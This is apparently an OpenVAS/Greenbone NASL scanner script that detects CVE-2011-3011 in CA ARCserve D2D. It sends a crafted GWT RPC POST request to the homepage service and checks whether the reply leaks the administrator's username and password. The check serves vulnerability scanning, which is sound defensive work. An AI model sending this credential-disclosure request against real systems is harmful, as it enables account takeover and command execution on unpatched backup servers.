if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902462" );
	script_version( "2021-09-01T07:45:06+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 07:45:06 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2011-07-29 17:55:33 +0200 (Fri, 29 Jul 2011)" );
	script_cve_id( "CVE-2011-3011" );
	script_bugtraq_id( 48897 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_name( "CA ARCserver D2D GWT RPC Request Multiple Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web Servers" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 8014 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "Successful exploitation will allow attackers to gain the
  sensitive information, further attacker can login to the affected
  application then execute arbitrary commands with Administrator group privileges." );
	script_tag( name: "affected", value: "CA ARCserver D2D Version r15.0." );
	script_tag( name: "insight", value: "Multiple flaws are due to error in GWT RPC mechanism when
  receives messages from the Administrator browser. A remote user with access
  to the web server can send a POST request to the homepageServlet serlvet
  containing the 'getLocalHost' message and the correct filename of a certain
  descriptor to disclose the username and password of the target application." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "The host is running CA ARCserver D2D and is prone to multiple
  vulnerabilities." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/view/103426/caarcserve-exec.txt" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 8014 );
res = http_get_cache( item: "/", port: port );
if(ContainsString( res, ">CA ARCserve D2D" )){
	host = http_host_name( port: port );
	postdata = NASLString( "5|0|4|http://", host, "/contents/|2C6B" + "33BED38F825C48AE73C093241510|com.ca.arcflash.ui.client" + ".homepage.HomepageService|getLocalHost|1|2|3|4|0|" );
	req = NASLString( "POST /contents/service/homepage HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: text/x-gwt-rpc; charset=utf-8\\r\\n", "Content-Length: ", strlen( postdata ), "\\r\\n", "\\r\\n", postdata );
	res = http_send_recv( port: port, data: req );
	if(ContainsString( res, "//OK" ) && ContainsString( res, "\"user\"" ) && ContainsString( res, "\"password\"" ) && ContainsString( res, "\"hostName\"" ) && ContainsString( res, "\"uuid\"" )){
		security_message( port: port );
		exit( 0 );
	}
}
exit( 99 );

